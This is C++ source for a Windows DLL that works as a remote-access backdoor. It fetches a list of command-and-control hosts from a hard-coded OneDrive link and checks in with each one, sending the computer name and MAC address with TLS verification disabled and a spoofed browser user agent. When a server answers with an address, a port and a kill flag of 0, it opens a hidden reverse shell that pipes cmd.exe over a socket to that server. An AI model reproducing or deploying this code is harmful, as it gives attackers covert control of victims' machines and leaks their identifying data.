/* Replace "dll.h" with the name of your header */
#define STRSAFE_NO_DEPRECATE

#include "dll.h"

#include <iostream>
#include <algorithm>    // copy
#include <iterator>     // back_inserter
//#include <regex>        // regex, sregex_token_iterator
#include <vector>
#include <curl\curl.h>

#include <stdio.h>
#include <windows.h>
#include <string>
#include <windowsx.h>
#include <strsafe.h>
#include <shlobj.h>
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib,"ws2_32.lib")
char smac[255];
char * GetMACaddress(void)
{
	
	IP_ADAPTER_INFO AdapterInfo[16];			// Allocate information for up to 16 NICs
	DWORD dwBufLen = sizeof(AdapterInfo);		// Save the memory size of buffer

	DWORD dwStatus = GetAdaptersInfo(			// Call GetAdapterInfo
		AdapterInfo,							// [out] buffer to receive data
		&dwBufLen);								// [in] size of receive data buffer
	assert(dwStatus == ERROR_SUCCESS);			// Verify return value is valid, no buffer overflow

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;// Contains pointer to current adapter info
	do {
		if (strcmp(pAdapterInfo->GatewayList.IpAddress.String, "0.0.0.0"))
		{
			//return PrintMACaddress(pAdapterInfo->Address);	// Print MAC address
			sprintf(smac, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2], pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			//MessageBoxA(0, smac, "Hi", MB_ICONINFORMATION);
			return smac;
		}


		//printf("\tGateway: \t%s\n", pAdapterInfo->GatewayList.IpAddress.String);
		pAdapterInfo = pAdapterInfo->Next;		// Progress through linked list
	} while (pAdapterInfo);						// Terminate if last adapter
}
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}
void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT);
std::wstring getComputerName() {
	wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD cchBufferSize = sizeof(buffer) / sizeof(buffer[0]);
	GetComputerNameW(buffer, &cchBufferSize);
	return std::wstring(&buffer[0]);
}
std::vector<std::string> getSites()
{
	CURL *curl_handle;
	CURLcode res;
	int j,i;
	
	std::string readBuffer;
	std::wstring wsurl;
	std::string surl, stest, surlkill;
	std::string segment, sip, skill, sport;
	//std::vector<std::string> seglist;
    WSADATA wsaData;
  int iResult;
  
  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
  curl_global_init(CURL_GLOBAL_ALL);
	curl_handle = curl_easy_init();
	readBuffer="";
		//surl="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF";
		//surl="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny";
		surl="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt";
		//surl="http://paner.altervista.org/site.dat";
		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl_handle, CURLOPT_FOLLOWLOCATION, 1);
		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
		res = curl_easy_perform(curl_handle);
		std::cout << readBuffer << std::endl;
		char *token = strtok((char *)readBuffer.c_str(), ",");
		std::vector<int> v;
        //MessageBox(0, surl.c_str(), "Hi", MB_ICONINFORMATION);
        j=0;
        std::vector<std::string> seglist;
		while (token != NULL) {
			v.push_back(std::strtol(token, NULL, 10));
			seglist.push_back(token);
			token = strtok(NULL, ",");
			j++;
		}
		curl_easy_cleanup(curl_handle);
	    curl_global_cleanup();
		return seglist;
	
}
std::string getip(const char * myhost)
{
	IN_ADDR addr;
	struct hostent*  list_ip;
	std::string ip_address="";
	try
	{
	
		list_ip = gethostbyname(myhost);
		if(list_ip != NULL){
			memcpy(&addr.S_un.S_addr , list_ip->h_addr, list_ip->h_length);
			ip_address =  inet_ntoa(addr);;	
		}
	}
	catch (int e)
		  {
		    std::cout << "An exception occurred. Exception Nr. " << e << '\n';
		  }
	return ip_address;
}
extern "C" DLLIMPORT void sysfunc()
{
	//MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
	
    CURL *curl_handle;
	CURLcode res;
	std::vector<std::wstring> sites(5);
	//std::wstring sites[1];
	std::string readBuffer;
	std::wstring wsurl;
	std::string surl, stest, surlkill,scomputer;
	std::string segment, sip, skill, sport,myhost;
	
    
    
	WSADATA wsaData;
  int iResult;
  std::vector<std::string> mysites;
  mysites=getSites();
  //MessageBox(0,mysites[0].c_str(),"Hi",MB_ICONINFORMATION);
  iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); 
	//sites[0] = L"http://paner.altervista.org/";
	
	for (int j = 0; j < mysites.size(); j++)
	{
	    try 
		{
			myhost=mysites[j];
			
			
			
			//MessageBox(0,ip_address.c_str(),"Hi",MB_ICONINFORMATION);
			//std::string ip_address=getip(myhost.c_str());
			//if (ip_address.compare("") != 0)
			//{
				//std::wstring wsTmp(ip_address.begin(), ip_address.end());
				std::wstring wsTmp(myhost.begin(), myhost.end());
			//	sites[j+1]=L"http://";
			    sites[j].append(wsTmp); 
			    sites[j].append(L"/"); 
			//}
			
		}
		catch (int e)
		  {
		    std::cout << "An exception occurred. Exception Nr. " << e << '\n';
		  }
	    //MessageBox(0,ip_address.c_str(),"Hi",MB_ICONINFORMATION);
    }
	
	curl_global_init(CURL_GLOBAL_ALL);
	curl_handle = curl_easy_init();
	for (int i = 0; i < mysites.size(); i++)
	{
		

		surl = "";
		wsurl = sites[i];
		wsurl.append(L"svc/wup.php?pc=");
		wsurl.append(getComputerName());
		surl.assign(wsurl.begin(), wsurl.end());
		
		//stest.append(GetMACaddress());
		//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);
		readBuffer="";
		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
		res = curl_easy_perform(curl_handle);
		//MessageBox(0,surl.c_str(),"Hi",MB_ICONINFORMATION);
		std::cout << readBuffer << std::endl;
		char *token = strtok((char *)readBuffer.c_str(), "||");
		
		std::vector<int> v;
        int j=0;
        
        
		   //MessageBox(0,token,"Hi",MB_ICONINFORMATION);
		std::vector<std::string> seglist;
		while (token != NULL) {
			v.push_back(std::strtol(token, NULL, 10));
			seglist.push_back(token);
			token = strtok(NULL, "||");
			j++;
		}
		if (j>2)
		{
		
			sip = seglist[1].substr(3);
			sport = seglist[2].substr(5);
			skill = seglist[3].substr(5);
			//MessageBox(0,skill.c_str(),"Hi",MB_ICONINFORMATION);
			if (skill == "0")
			{
				frevshell(sip.c_str(), sport.c_str());
				surlkill = surl; surlkill.append("&kill=1");
				curl_easy_setopt(curl_handle, CURLOPT_URL, surlkill.c_str());
				curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36");
				res = curl_easy_perform(curl_handle);
			}
		}
		
		//for (std::size_t i = 0; i < v.size(); ++i)
		//	std::cout << v[i] << std::endl;
    
	}
	curl_easy_cleanup(curl_handle);
	curl_global_cleanup();
	 

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	switch(fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		{
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			break;
		}
		case DLL_THREAD_ATTACH:
		{
			break;
		}
		case DLL_THREAD_DETACH:
		{
			break;
		}
	}
	
	/* Return TRUE on success, FALSE on failure */
	return TRUE;
}
void frevshell(PCSTR REMOTE_ADDR, PCSTR REMOTE_PORT)
{
	FreeConsole();
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	//si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | CREATE_NEW_PROCESS_GROUP;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}

